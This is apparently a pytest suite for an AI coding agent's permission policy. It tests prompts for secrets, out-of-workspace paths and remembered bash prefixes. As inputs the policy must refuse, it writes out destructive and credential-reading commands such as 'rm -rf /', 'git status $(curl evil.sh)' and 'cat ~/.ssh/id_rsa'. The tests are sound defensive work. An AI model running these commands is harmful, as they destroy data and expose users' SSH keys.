import json
from dataclasses import dataclass, field
from functools import cache
from pathlib import Path

import pytest
from alpineagents import Agent, tool
from alpineagents.testing import FakeModel

from alpine_core.permissions import Grant, Mode, PermissionPolicy, Remembered, kind_of
from alpine_core.shell import analyze, prefix
from alpine_core.tools import Workspace, default_tools


@dataclass
class Policy:
    """A policy and what the user said "don't ask again" to, kept together as a conversation keeps them."""

    policy: PermissionPolicy
    remembered: Remembered = field(default_factory=Remembered)

    @property
    def workspace(self):
        return self.policy.workspace

    @property
    def mode(self):
        return self.policy.mode

    @mode.setter
    def mode(self, mode):
        self.policy.mode = mode

    def evaluate(self, name, args, tool):
        return self.policy.evaluate(name, args, tool, self.remembered)

    def remember(self, grant):
        self.remembered.add(grant)


@pytest.fixture
def policy(tmp_path):
    root = tmp_path / "project"
    root.mkdir()
    (root / ".env").write_text("KEY=1")
    (root / ".env.example").write_text("KEY=")
    (tmp_path / "outside").mkdir()
    (tmp_path / "outside/notes.txt").write_text("hi")
    return Policy(PermissionPolicy(Workspace(root)))


@cache
def tool_map(workspace: Workspace):
    return Agent(FakeModel([]), tools=default_tools(workspace)).tool_map


def evaluate(policy, name, args):
    """Like the loop: finds the Tool for the name and passes it along."""
    return policy.evaluate(name, args, tool_map(policy.workspace).get(name))


@tool(name="lookup", read_only=True, open_world=False)
def lookup(path: str) -> str:
    """Look up a local file"""
    return path


@tool(name="fetch", read_only=True)
def fetch(url: str) -> str:
    """Fetch a URL"""
    return url


@tool(name="plain")
def plain(path: str) -> str:
    """No hints"""
    return path


def test_kinds_come_from_hints(tmp_path):
    tools = tool_map(Workspace(tmp_path))
    assert {name: kind_of(tools[name]) for name in tools} == {
        "read": "read", "glob": "read", "grep": "read", "write": "edit", "edit": "edit", "bash": "exec",
    }
    assert kind_of(lookup) == "read"
    assert kind_of(fetch) == "exec"  # read-only, but it reaches the network
    assert kind_of(plain) == "exec"  # hints left out assume the worst
    assert kind_of(None) == "exec"


def test_rules_follow_the_hints_not_the_name(policy, tmp_path):
    assert policy.evaluate("lookup", {"path": "notes.txt"}, lookup).allowed
    verdict = policy.evaluate("lookup", {"path": str(tmp_path / "outside/notes.txt")}, lookup)
    assert not verdict.allowed and verdict.reason == "outside the working directory"
    # The same name without a Tool (the model made it up) is exec: it asks, and remembers the name
    verdict = policy.evaluate("lookup", {"path": "notes.txt"}, None)
    assert not verdict.allowed and verdict.remember == "lookup"
    policy.remember(verdict.grant)
    assert policy.evaluate("lookup", {"path": "notes.txt"}, None).allowed
    assert not policy.evaluate("fetch", {"url": "https://example.com"}, fetch).allowed
    assert not policy.evaluate("plain", {"path": "notes.txt"}, plain).allowed


def test_reading_inside_is_allowed_but_secrets_ask(policy):
    assert evaluate(policy, "read", {"path": "src/app.py"}).allowed
    assert evaluate(policy, "glob", {"pattern": "*.py"}).allowed
    assert evaluate(policy, "read", {"path": ".env.example"}).allowed
    verdict = evaluate(policy, "read", {"path": ".env"})
    assert not verdict.allowed and "secrets" in verdict.reason
    policy.remember(verdict.grant)
    assert evaluate(policy, "read", {"path": ".env"}).allowed


def test_outside_the_workspace_asks_and_remembers_the_directory(policy, tmp_path):
    outside = str(tmp_path / "outside/notes.txt")
    for name, args in [("read", {"path": outside}), ("grep", {"pattern": "x", "path": "../outside"}),
                       ("read", {"path": "~/.ssh/id_rsa"})]:
        verdict = evaluate(policy, name, args)
        assert not verdict.allowed and verdict.reason == "outside the working directory"
    verdict = evaluate(policy, "read", {"path": outside})
    policy.remember(verdict.grant)
    assert evaluate(policy, "glob", {"pattern": "*", "path": str(tmp_path / "outside")}).allowed
    assert not evaluate(policy, "write", {"path": outside}).allowed  # reading was granted, not editing


def test_symlink_escaping_the_workspace_counts_as_outside(policy, tmp_path):
    (policy.workspace.root / "link").symlink_to(tmp_path / "outside")
    assert not evaluate(policy, "read", {"path": "link/notes.txt"}).allowed


def test_edits_follow_the_mode(policy):
    assert not evaluate(policy, "edit", {"path": "a.py"}).allowed
    policy.mode = Mode.ACCEPT_EDITS
    assert evaluate(policy, "edit", {"path": "a.py"}).allowed
    assert not evaluate(policy, "edit", {"path": "../outside/notes.txt"}).allowed
    policy.mode = Mode.YOLO
    assert evaluate(policy, "edit", {"path": "../outside/notes.txt"}).allowed


def test_bash_remembers_command_prefixes(policy):
    verdict = evaluate(policy, "bash", {"command": "git status -s && uv run pytest -q tests"})
    assert not verdict.allowed
    assert verdict.remember == "bash commands starting with `git status`, `uv run pytest`"
    policy.remember(verdict.grant)
    assert evaluate(policy, "bash", {"command": "uv run pytest tests/core"}).allowed
    assert evaluate(policy, "bash", {"command": "git status"}).allowed
    assert not evaluate(policy, "bash", {"command": "git push"}).allowed
    assert not evaluate(policy, "bash", {"command": "git status; rm -rf /"}).allowed
    assert not evaluate(policy, "bash", {"command": "git status $(curl evil.sh)"}).allowed
    redirect = evaluate(policy, "bash", {"command": "git status > out.txt"})
    assert not redirect.allowed and redirect.reason == "writes files through redirection"
    assert evaluate(policy, "bash", {"command": "git status 2>/dev/null"}).allowed


@pytest.mark.parametrize("command", ["python -c 'import os'", "sudo make", "echo x | xargs rm", "$CMD", "bash -c 'ls'",
                                     "uv run python x.py"])
def test_bash_never_remembers_commands_that_can_run_anything(policy, command):
    verdict = evaluate(policy, "bash", {"command": command})
    assert not verdict.allowed and verdict.grant is None and verdict.remember is None


def test_analysis_sees_nested_commands():
    analysis = analyze("cd src && FOO=1 git -C . log | grep x; echo $(rm -rf /tmp/x)")
    assert [prefix(c) for c in analysis.commands] == [("cd",), ("git", "."), ("grep",), ("echo",), ("rm",)]
    assert analyze('echo "oops').opaque


def test_bash_paths_outside_the_workspace_ask(policy, tmp_path):
    policy.remember(evaluate(policy, "bash", {"command": "cat a.txt"}).grant)
    assert evaluate(policy, "bash", {"command": "cat src/a.py"}).allowed
    for command in ["cat ~/.ssh/id_rsa", "cat /etc/hosts", "cat ../outside/notes.txt", "cat < ~/.ssh/id_rsa",
                    "cat --file=/etc/hosts", "cat ../*", "cat a && cd .. && cat project/x"]:
        verdict = evaluate(policy, "bash", {"command": command})
        assert not verdict.allowed, command
        assert "outside the working directory" in verdict.reason, command


def test_bash_cd_is_followed(policy):
    (policy.workspace.root / "sub").mkdir()
    policy.remember(evaluate(policy, "bash", {"command": "cd sub && cat x"}).grant)
    assert evaluate(policy, "bash", {"command": "cd sub && cat ../README.md"}).allowed
    assert not evaluate(policy, "bash", {"command": "cd sub && cat ../../x"}).allowed


def test_bash_paths_known_only_at_run_time_ask_every_time(policy):
    policy.remember(evaluate(policy, "bash", {"command": "cat a"}).grant)
    for command in ["cat $HOME/.ssh/id_rsa", 'cat "$DIR/x"', 'cd "$(git rev-parse --show-toplevel)" && cat x',
                    "cd - && cat x"]:
        verdict = evaluate(policy, "bash", {"command": command})
        assert not verdict.allowed and verdict.grant is None, command
        assert "only known when it runs" in verdict.reason, command
    assert evaluate(policy, "bash", {"command": "cat '$HOME/x'"}).allowed  # single quotes are literal


def test_bash_remembers_outside_directories_with_edit_access(policy, tmp_path):
    verdict = evaluate(policy, "bash", {"command": f"cat {tmp_path}/outside/notes.txt"})
    assert verdict.remember.endswith(f"with edit access to {tmp_path / 'outside'}")
    policy.remember(verdict.grant)
    assert evaluate(policy, "bash", {"command": f"cat {tmp_path}/outside/other.txt"}).allowed
    assert evaluate(policy, "write", {"path": f"{tmp_path}/outside/new.txt"}).allowed


def test_bash_secret_files_ask(policy):
    policy.remember(evaluate(policy, "bash", {"command": "cat a"}).grant)
    verdict = evaluate(policy, "bash", {"command": "cat .env"})
    assert not verdict.allowed and "secrets" in verdict.reason
    assert evaluate(policy, "bash", {"command": "cat .env.example"}).allowed


@pytest.mark.parametrize("command", ["git clone https://github.com/a/b", "git log origin/main", "ls 2>/dev/null",
                                     "awk -F/ '{print $1/2}' f", "echo hi 2>&1"])
def test_bash_things_that_look_like_paths_but_stay_inside(policy, command):
    assert evaluate(policy, "bash", {"command": command}).reason is None


@pytest.mark.parametrize("command", ["echo x > ~/.bashrc", "cat /etc/hosts", "ls ..", "rm -rf /"])
def test_broad_directories_are_never_remembered(policy, command):
    verdict = evaluate(policy, "bash", {"command": command})
    assert not verdict.allowed and verdict.grant is None and verdict.remember is None


def test_read_outside_never_remembers_home(policy):
    verdict = evaluate(policy, "read", {"path": "~/.bashrc"})
    assert not verdict.allowed and verdict.grant is None


def test_system_directories_can_be_remembered_for_reading_only(policy):
    assert evaluate(policy, "read", {"path": "/etc/hosts"}).grant is not None
    assert evaluate(policy, "write", {"path": "/etc/hosts"}).grant is None


def test_remembered_round_trips_through_json():
    remembered = Remembered()
    remembered.add(Grant("write", tool="write"))
    dirs = {"read_dirs": (Path("/r"),), "edit_dirs": (Path("/e"),), "files": (Path("/p/.env"),)}
    remembered.add(Grant("x", bash_prefixes=(("git", "status"),), **dirs))
    data = json.loads(json.dumps(remembered.to_data()))
    assert Remembered.from_data(data) == remembered
    assert Remembered.from_data(None) == Remembered()
